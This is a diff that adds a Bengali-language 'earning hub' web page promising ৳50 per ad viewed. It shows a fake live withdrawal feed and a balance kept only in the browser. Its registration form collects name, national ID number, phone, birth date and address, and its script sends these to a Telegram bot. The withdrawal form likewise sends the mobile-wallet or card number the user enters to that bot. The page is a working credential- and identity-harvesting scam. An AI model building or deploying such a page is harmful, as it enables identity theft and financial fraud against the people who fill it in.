@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tasin Earning Hub - Shining Edition</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0b0f19;
+            --card-bg: rgba(22, 31, 48, 0.75);
+            --accent-blue: #38bdf8;
+            --accent-green: #22c55e;
+            --accent-pink: #ec4899;
+            --text-main: #f8fafc;
+            --text-sub: #94a3b8;
+            --glass-border: rgba(255, 255, 255, 0.08);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: radial-gradient(circle at top left, #1e1b4b, #0b0f19, #0f172a);
+            color: var(--text-main);
+            min-height: 100vh;
+            padding-bottom: 70px;
+        }
+
+        .navbar {
+            background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--glass-border);
+            padding: 14px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .shining-logo-icon {
+            width: 38px;
+            height: 38px;
+            background: linear-gradient(135deg, #38bdf8, #ec4899, #eab308);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 18px;
+            box-shadow: 0 0 15px rgba(236, 72, 153, 0.6), 0 0 25px rgba(56, 189, 248, 0.4);
+            animation: pulseGlow 2.5s infinite alternate;
+        }
+
+        .shining-logo-text {
+            font-size: 18px;
+            font-weight: 900;
+            background: linear-gradient(90deg, #38bdf8, #f472b6, #fef08a, #38bdf8);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shineText 3s linear infinite;
+            letter-spacing: 0.5px;
+        }
+
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 10px rgba(236, 72, 153, 0.5), 0 0 20px rgba(56, 189, 248, 0.3); transform: scale(1); }
+            100% { box-shadow: 0 0 20px rgba(236, 72, 153, 0.9), 0 0 35px rgba(234, 179, 8, 0.7); transform: scale(1.05); }
+        }
+
+        @keyframes shineText {
+            to { background-position: 200% center; }
+        }
+
+        .btn-glow {
+            background: linear-gradient(135deg, #2563eb, #3b82f6);
+            color: white;
+            border: none;
+            padding: 9px 16px;
+            border-radius: 30px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
+            font-size: 12px;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+        .hero-card {
+            background: linear-gradient(135deg, rgba(37, 99, 235, 0.2), rgba(236, 72, 153, 0.15));
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            border-radius: 20px;
+            padding: 22px;
+            text-align: center;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        .user-tag {
+            font-size: 12px;
+            color: var(--accent-green);
+            background: rgba(34, 197, 94, 0.1);
+            padding: 4px 12px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 10px;
+            border: 1px solid rgba(34, 197, 94, 0.2);
+        }
+
+        .balance-amount {
+            font-size: 42px;
+            font-weight: 800;
+            color: #ffffff;
+            margin: 5px 0;
+            text-shadow: 0 0 20px rgba(56, 189, 248, 0.4);
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .card-header i {
+            font-size: 20px;
+            color: var(--accent-blue);
+        }
+
+        .ad-banner-box {
+            background: rgba(15, 23, 42, 0.9);
+            border: 1px dashed var(--accent-pink);
+            border-radius: 14px;
+            padding: 18px;
+            text-align: center;
+            margin: 15px 0;
+            min-height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .payment-methods {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .pay-option {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            padding: 12px 5px;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        .pay-option.selected {
+            border-color: var(--accent-green);
+            background: rgba(34, 197, 94, 0.1);
+        }
+
+        .pay-option i {
+            font-size: 20px;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .pay-option.bkash i { color: #e2136e; }
+        .pay-option.nagad i { color: #f7921e; }
+        .pay-option.card i { color: #38bdf8; }
+
+        .input-group {
+            margin-bottom: 12px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: var(--text-sub);
+            margin-bottom: 5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 11px 14px;
+            background: rgba(15, 23, 42, 0.9);
+            border: 1px solid var(--glass-border);
+            border-radius: 10px;
+            color: white;
+            font-size: 13px;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: var(--accent-blue);
+        }
+
+        .btn-action {
+            width: 100%;
+            padding: 13px;
+            border-radius: 10px;
+            border: none;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-ad { background: linear-gradient(135deg, #ec4899, #8b5cf6); color: white; }
+        .btn-withdraw { background: linear-gradient(135deg, #10b981, #059669); color: white; }
+
+        .btn-helpline {
+            background: linear-gradient(135deg, #0088cc, #229ed9);
+            color: white;
+            text-decoration: none;
+            margin-top: 10px;
+            border-radius: 12px;
+            padding: 12px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.4);
+        }
+
+        .withdraw-feed {
+            max-height: 250px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .feed-item {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            padding: 12px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .user-details { display: flex; align-items: center; gap: 10px; }
+        .user-avatar {
+            width: 35px; height: 35px; border-radius: 50%;
+            background: rgba(56, 189, 248, 0.15); color: var(--accent-blue);
+            display: flex; align-items: center; justify-content: center;
+            font-weight: bold; font-size: 14px;
+        }
+
+        .amount-green { color: var(--accent-green); font-weight: 700; font-size: 15px; }
+
+        .modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px);
+            justify-content: center; align-items: center; z-index: 1000;
+        }
+
+        .modal-content {
+            background: #1e293b; border: 1px solid var(--glass-border);
+            border-radius: 20px; padding: 22px; width: 90%; max-width: 400px; position: relative;
+        }
+
+        .tab-btn {
+            width: 48%; padding: 8px; border: none; background: rgba(255, 255, 255, 0.05);
+            color: var(--text-sub); border-radius: 8px; cursor: pointer; font-weight: 600;
+        }
+
+        .tab-btn.active { background: var(--accent-blue); color: white; }
+        .close-btn { position: absolute; top: 15px; right: 18px; font-size: 20px; color: var(--text-sub); cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar">
+        <div class="logo-container">
+            <div class="shining-logo-icon">
+                <i class="fa-solid fa-gem"></i>
+            </div>
+            <div class="shining-logo-text">Tasin earning.hub</div>
+        </div>
+        <button id="auth-btn" class="btn-glow" onclick="toggleAuthModal()">
+            <i class="fa-solid fa-user-plus"></i> অ্যাকাউন্ট
+        </button>
+    </nav>
+
+    <div class="container">
+        <!-- ওয়ালেট ব্যালেন্স কার্ড -->
+        <div class="hero-card">
+            <span class="user-tag" id="user-display"><i class="fa-solid fa-shield"></i> গেস্ট মোড</span>
+            <div style="font-size: 13px; color: var(--text-sub);">বর্তমান ওয়ালেট ব্যালেন্স</div>
+            <div class="balance-amount">৳ <span id="balance-amount">0.00</span></div>
+        </div>
+
+        <!-- অ্যাড মিশন কার্ড -->
+        <div class="card">
+            <div class="card-header">
+                <i class="fa-solid fa-bolt" style="color: #eab308;"></i>
+                <h3>স্পনসরড অ্যাড মিশন (৳৫০)</h3>
+            </div>
+            
+            <div class="ad-banner-box" id="ad-banner-box">
+                <i class="fa-solid fa-play-circle" style="font-size: 30px; color: var(--accent-pink); margin-bottom: 6px;"></i>
+                <p style="font-size: 13px; color: #cbd5e1;"><b>বিজ্ঞাপন দেখে আয় করুন</b><br>প্রতি অ্যাডে পাবেন সরাসরি <b>৳৫০</b> টাকা!</p>
+            </div>
+
+            <button id="watch-ad-btn" class="btn-action btn-ad" onclick="watchAdAndRedirect()">
+                <i class="fa-solid fa-eye"></i> অ্যাড দেখুন ও ৳৫০ ইনকাম করুন
+            </button>
+        </div>
+
+        <!-- হেল্পলাইন -->
+        <div class="card" style="text-align: center; background: linear-gradient(135deg, rgba(0,136,204,0.1), rgba(15,23,42,0.8)); border-color: rgba(0,136,204,0.3);">
+            <div style="display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:5px;">
+                <i class="fa-solid fa-headset" style="color: #38bdf8; font-size:20px;"></i>
+                <h3 style="font-size: 16px;">২৪/৭ সাহায্য ও সাপোর্ট</h3>
+            </div>
+            <p style="font-size:12px; color: var(--text-sub);">যেকোনো সমস্যায় টেলিগ্রামে যোগাযোগ করুন</p>
+            <a href="https://t.me/Tabassum_vip" target="_blank" class="btn-helpline">
+                <i class="fa-paper-plane fa-solid"></i> হেল্পলাইন: @Tabassum_vip
+            </a>
+        </div>
+
+        <!-- টাকা উইথড্র সেকশন -->
+        <div class="card">
+            <div class="card-header">
+                <i class="fa-solid fa-wallet"></i>
+                <h3>টাকা ক্যাশআউট করুন</h3>
+            </div>
+
+            <div class="payment-methods">
+                <div class="pay-option bkash selected" onclick="selectMethod('bkash', this)">
+                    <i class="fa-solid fa-mobile-screen-button"></i><span style="font-size:11px;">bKash</span>
+                </div>
+                <div class="pay-option nagad" onclick="selectMethod('nagad', this)">
+                    <i class="fa-solid fa-building-columns"></i><span style="font-size:11px;">Nagad</span>
+                </div>
+                <div class="pay-option card" onclick="selectMethod('card', this)">
+                    <i class="fa-solid fa-credit-card"></i><span style="font-size:11px;">Card</span>
+                </div>
+            </div>
+
+            <form onsubmit="handleWithdraw(event)">
+                <div class="input-group">
+                    <label id="acc-label">বিকাশ নম্বর দিন</label>
+                    <input type="text" id="acc-num" placeholder="017XXXXXXXX" required>
+                </div>
+                <div class="input-group">
+                    <label>টাকার পরিমাণ (সর্বনিম্ন ৳৫৭০)</label>
+                    <input type="number" id="amount" placeholder="570" min="570" required>
+                </div>
+                <button type="submit" class="btn-action btn-withdraw">
+                    <i class="fa-solid fa-paper-plane"></i> উইথড্র রিকোয়েস্ট দিন
+                </button>
+            </form>
+        </div>
+
+        <!-- রিসেন্ট উইথড্র ফিড -->
+        <div class="card">
+            <div class="card-header" style="justify-content: space-between;">
+                <div style="display:flex; align-items:center; gap:10px;">
+                    <i class="fa-solid fa-clock-rotate-left" style="color: var(--accent-green);"></i>
+                    <h3>গত ২৪ ঘণ্টার উত্তোলন</h3>
+                </div>
+                <span style="font-size: 11px; background: rgba(34, 197, 94, 0.15); color: var(--accent-green); padding: 3px 8px; border-radius: 10px;">• LIVE</span>
+            </div>
+            <div class="withdraw-feed" id="withdraw-feed-list"></div>
+        </div>
+    </div>
+
+    <!-- রেজিস্ট্রেশন/লগইন মোডাল -->
+    <div id="auth-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="toggleAuthModal()">&times;</span>
+            <div style="display:flex; justify-content:space-between; margin-bottom:15px;">
+                <button class="tab-btn active" id="tab-reg" onclick="switchTab('register')">রেজিস্ট্রেশন (NID)</button>
+                <button class="tab-btn" id="tab-login" onclick="switchTab('login')">লগইন</button>
+            </div>
+
+            <form id="reg-form" onsubmit="handleRegister(event)">
+                <div class="input-group">
+                    <label>আপনার পূর্ণ নাম (NID অনুযায়ী)</label>
+                    <input type="text" id="reg-fullname" placeholder="মোঃ আসাদুল ইসলাম" required>
+                </div>
+                <div class="input-group">
+                    <label>NID কার্ড নম্বর</label>
+                    <input type="number" id="reg-nid" placeholder="1234567890" required>
+                </div>
+                <div class="input-group">
+                    <label>ফোন নম্বর</label>
+                    <input type="tel" id="reg-phone" placeholder="017XXXXXXXX" required>
+                </div>
+                <div class="input-group">
+                    <label>জন্ম তারিখ</label>
+                    <input type="date" id="reg-dob" required style="color-scheme: dark;">
+                </div>
+                <div class="input-group">
+                    <label>বর্তমান ঠিকানা</label>
+                    <input type="text" id="reg-address" placeholder="গ্রাম/শহর, জেলা" required>
+                </div>
+                <div class="input-group">
+                    <label>পাসওয়ার্ড</label>
+                    <input type="password" id="reg-password" placeholder="******" required>
+                </div>
+                <button type="submit" class="btn-action btn-ad">NID ভেরিফাই ও অ্যাকাউন্ট খুলুন</button>
+            </form>
+
+            <form id="login-form" onsubmit="handleLogin(event)" style="display: none;">
+                <div class="input-group"><label>NID নম্বর / নাম</label><input type="text" id="login-nid" required></div>
+                <div class="input-group"><label>পাসওয়ার্ড</label><input type="password" id="login-pass" required></div>
+                <button type="submit" class="btn-action btn-withdraw">লগইন করুন</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // টেলিগ্রাম বট কনফিগারেশন
+        const TELEGRAM_BOT_TOKEN = "8626324844"; 
+        const TELEGRAM_CHAT_ID = "8865305442";     
+
+        let currentUser = null;
+        let userBalance = 0.00;
+        let isAdRunning = false;
+        let selectedPaymentMethod = 'bkash';
+
+        let adClickCount = 0;
+        const adTargetLinks = [
+            "https://youtu.be/KKnWnXcDpMw?si=lSLrH_TSqaiq_0gY",
+            "https://youtu.be/pmj0NzN6Jd8?si=qO5AWvwxLJqlZ47p",
+            "https://t.me/Cc12110"
+        ];
+
+        let recentWithdrawals = [
+            { name: "মেহেদী হাসান", amount: 600, method: "bkash", time: "১০ মিনিট আগে" },
+            { name: "রাকিবা আক্তার", amount: 570, method: "nagad", time: "৩৫ মিনিট আগে" }
+        ];
+
+        window.onload = function() {
+            const savedUser = JSON.parse(localStorage.getItem('tasin_nid_user'));
+            const savedBalance = localStorage.getItem('tasin_nid_balance');
+            const savedFeed = JSON.parse(localStorage.getItem('tasin_withdraw_feed'));
+            const savedClicks = localStorage.getItem('tasin_ad_click_count');
+            
+            if (savedUser) { currentUser = savedUser; userBalance = savedBalance ? parseFloat(savedBalance) : 0.00; }
+            if (savedFeed) { recentWithdrawals = savedFeed; }
+            if (savedClicks) { adClickCount = parseInt(savedClicks); }
+
+            updateUI();
+            renderWithdrawFeed();
+        };
+
+        function updateUI() {
+            if (currentUser) {
+                document.getElementById('user-display').innerHTML = `<i class="fa-solid fa-circle-check"></i> ${currentUser.fullname} (Verified)`;
+                document.getElementById('auth-btn').innerHTML = `<i class="fa-solid fa-right-from-bracket"></i> লগআউট`;
+                document.getElementById('auth-btn').onclick = logout;
+            } else {
+                document.getElementById('user-display').innerHTML = `<i class="fa-solid fa-shield"></i> গেস্ট মোড (Unverified)`;
+                document.getElementById('auth-btn').innerHTML = `<i class="fa-solid fa-user-plus"></i> অ্যাকাউন্ট`;
+                document.getElementById('auth-btn').onclick = toggleAuthModal;
+            }
+            document.getElementById('balance-amount').innerText = userBalance.toFixed(2);
+        }
+
+        function renderWithdrawFeed() {
+            const feedContainer = document.getElementById('withdraw-feed-list');
+            feedContainer.innerHTML = '';
+            recentWithdrawals.forEach(item => {
+                feedContainer.innerHTML += `
+                    <div class="feed-item">
+                        <div class="user-details">
+                            <div class="user-avatar">${item.name.charAt(0)}</div>
+                            <div>
+                                <div style="font-size:13px; font-weight:600;">${item.name}</div>
+                                <div style="font-size:11px; color:var(--text-sub);">${item.time}</div>
+                            </div>
+                        </div>
+                        <div style="text-align:right;">
+                            <div class="amount-green">+ ৳${item.amount}</div>
+                            <span style="font-size:10px; background:rgba(255,255,255,0.08); padding:2px 6px; border-radius:4px; text-transform:uppercase;">${item.method}</span>
+                        </div>
+                    </div>`;
+            });
+        }
+
+        function toggleAuthModal() {
+            const modal = document.getElementById('auth-modal');
+            modal.style.display = (modal.style.display === 'flex') ? 'none' : 'flex';
+        }
+
+        function switchTab(type) {
+            if(type === 'register') {
+                document.getElementById('reg-form').style.display = 'block';
+                document.getElementById('login-form').style.display = 'none';
+                document.getElementById('tab-reg').classList.add('active');
+                document.getElementById('tab-login').classList.remove('active');
+            } else {
+                document.getElementById('reg-form').style.display = 'none';
+                document.getElementById('login-form').style.display = 'block';
+                document.getElementById('tab-login').classList.add('active');
+                document.getElementById('tab-reg').classList.remove('active');
+            }
+        }
+
+        // টেলিগ্রামে মেসেজ নোটিফিকেশন পাঠানোর ফাংশন
+        function sendTelegramNotification(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.error("Telegram Send Error:", err));
+        }
+
+        // অ্যাকাউন্ট রেজিস্ট্রেশন হ্যান্ডলার
+        function handleRegister(e) {
+            e.preventDefault();
+            const fullname = document.getElementById('reg-fullname').value;
+            const nid = document.getElementById('reg-nid').value;
+            const phone = document.getElementById('reg-phone').value;
+            const dob = document.getElementById('reg-dob').value;
+            const address = document.getElementById('reg-address').value;
+
+            if (nid.length < 10) { alert('সঠিক NID নম্বর দিন!'); return; }
+
+            currentUser = { fullname, nid, phone, dob, address };
+            localStorage.setItem('tasin_nid_user', JSON.stringify(currentUser));
+            localStorage.setItem('tasin_nid_balance', userBalance);
+
+            // টেলিগ্রামে মেসেজ পাঠানো
+            const tgMessage = `🔔 <b>নতুন অ্যাকাউন্ট রেজিস্ট্রেশন!</b>\n\n` +
+                              `👤 <b>নাম:</b> ${fullname}\n` +
+                              `🆔 <b>NID:</b> ${nid}\n` +
+                              `📱 <b>ফোন:</b> ${phone}\n` +
+                              `📅 <b>জন্ম তারিখ:</b> ${dob}\n` +
+                              `🏠 <b>ঠিকানা:</b> ${address}`;
+
+            sendTelegramNotification(tgMessage);
+
+            alert(`অভিনন্দন ${fullname}! NID ভেরিফিকেশন সফল হয়েছে।`);
+            toggleAuthModal(); 
+            updateUI();
+        }
+
+        function handleLogin(e) {
+            e.preventDefault();
+            const savedUser = JSON.parse(localStorage.getItem('tasin_nid_user'));
+            if(savedUser) { currentUser = savedUser; toggleAuthModal(); updateUI(); alert('লগইন সফল!'); } 
+            else { alert('কোনো অ্যাকাউন্ট পাওয়া যায়নি!'); }
+        }
+
+        function logout() { currentUser = null; localStorage.removeItem('tasin_nid_user'); updateUI(); }
+
+        function selectMethod(method, element) {
+            selectedPaymentMethod = method;
+            document.querySelectorAll('.pay-option').forEach(opt => opt.classList.remove('selected'));
+            element.classList.add('selected');
+            const label = document.getElementById('acc-label');
+            const input = document.getElementById('acc-num');
+
+            if (method === 'bkash') { label.innerText = "বিকাশ নম্বর দিন"; input.placeholder = "017XXXXXXXX"; }
+            else if (method === 'nagad') { label.innerText = "নগদ নম্বর দিন"; input.placeholder = "018XXXXXXXX"; }
+            else { label.innerText = "কার্ড নম্বর (Visa/Mastercard)"; input.placeholder = "4532 XXXX XXXX XXXX"; }
+        }
+
+        // অ্যাড দেখা ও টাকা আয়
+        function watchAdAndRedirect() {
+            if (!currentUser) { alert('অ্যাড দেখে ৳৫০ আয় করতে প্রথমে NID দিয়ে অ্যাকাউন্ট খুলুন!'); toggleAuthModal(); return; }
+            if (isAdRunning) return;
+
+            isAdRunning = true;
+            const watchBtn = document.getElementById('watch-ad-btn');
+            const adBox = document.getElementById('ad-banner-box');
+            watchBtn.disabled = true;
+
+            let targetUrl = adTargetLinks[adClickCount % 3];
+            window.open(targetUrl, '_blank');
+
+            let timeLeft = 5;
+            adBox.innerHTML = `
+                <div style="text-align:center;">
+                    <i class="fa-solid fa-spinner fa-spin" style="font-size: 32px; color: var(--accent-pink);"></i>
+                    <p style="margin-top: 10px; font-size:13px;"><b>লিংকে কাজ চলছে...</b><br>অপেক্ষা করুন <b>${timeLeft}</b> সেকেন্ড</p>
+                </div>`;
+
+            const timer = setInterval(() => {
+                timeLeft--;
+                if (timeLeft > 0) {
+                    adBox.innerHTML = `
+                        <div style="text-align:center;">
+                            <i class="fa-solid fa-spinner fa-spin" style="font-size: 32px; color: var(--accent-pink);"></i>
+                            <p style="margin-top: 10px; font-size:13px;"><b>লিংকে কাজ চলছে...</b><br>অপেক্ষা করুন <b>${timeLeft}</b> সেকেন্ড</p>
+                        </div>`;
+                } else {
+                    clearInterval(timer);
+                    userBalance += 50.00;
+                    localStorage.setItem('tasin_nid_balance', userBalance);
+
+                    adClickCount++;
+                    localStorage.setItem('tasin_ad_click_count', adClickCount);
+
+                    updateUI();
+                    
+                    adBox.innerHTML = `
+                        <div style="text-align:center;">
+                            <i class="fa-solid fa-circle-check" style="font-size: 32px; color: var(--accent-green);"></i>
+                            <p style="margin-top: 8px; font-size:13px; color:var(--accent-green);"><b>অ্যাড দেখা সফল হয়েছে!</b><br>আপনার ওয়ালেটে ৳৫০.০০ যোগ হয়েছে।</p>
+                        </div>`;
+                    watchBtn.disabled = false;
+                    isAdRunning = false;
+                }
+            }, 1000);
+        }
+
+        // উইথড্র হ্যান্ডলার (সর্বনিম্ন ৫৭০ টাকা চেক)
+        function handleWithdraw(e) {
+            e.preventDefault();
+            if (!currentUser) { alert('উইথড্র করতে প্রথমে NID দিয়ে অ্যাকাউন্ট খুলুন!'); toggleAuthModal(); return; }
+
+            const accNum = document.getElementById('acc-num').value;
+            const amount = parseFloat(document.getElementById('amount').value);
+
+            // সর্বনিম্ন ৫৭০ টাকার শর্ত
+            if (amount < 570) {
+                alert('সর্বনিম্ন উইথড্র পরিমাণ ৳৫৭০ টাকা!');
+                return;
+            }
+
+            if (amount > userBalance) { alert('আপনার ওয়ালেটে পর্যাপ্ত টাকা নেই!'); return; }
+
+            userBalance -= amount;
+            localStorage.setItem('tasin_nid_balance', userBalance);
+
+            recentWithdrawals.unshift({ name: currentUser.fullname, amount: amount, method: selectedPaymentMethod, time: "এইমাত্র" });
+            localStorage.setItem('tasin_withdraw_feed', JSON.stringify(recentWithdrawals));
+
+            // টেলিগ্রামে উইথড্র মেসেজ পাঠানো
+            const withdrawMsg = `💸 <b>উইথড্র রিকোয়েস্ট এসেছে!</b>\n\n` +
+                               `👤 <b>ইউজার:</b> ${currentUser.fullname}\n` +
+                               `🆔 <b>NID:</b> ${currentUser.nid}\n` +
+                               `💳 <b>মেথড:</b> ${selectedPaymentMethod.toUpperCase()}\n` +
+                               `📱 <b>নম্বর:</b> ${accNum}\n` +
+                               `💰 <b>পরিমাণ:</b> ৳${amount}`;
+
+            sendTelegramNotification(withdrawMsg);
+
+            updateUI(); renderWithdrawFeed();
+            alert(`উইথড্র রিকোয়েস্ট সফল!\n\nনাম: ${currentUser.fullname}\nমেথড: ${selectedPaymentMethod.toUpperCase()}\nপরিমাণ: ৳${amount}`);
+            document.getElementById('acc-num').value = ''; document.getElementById('amount').value = '';
+        }
+    </script>
+</body>
+  </html>
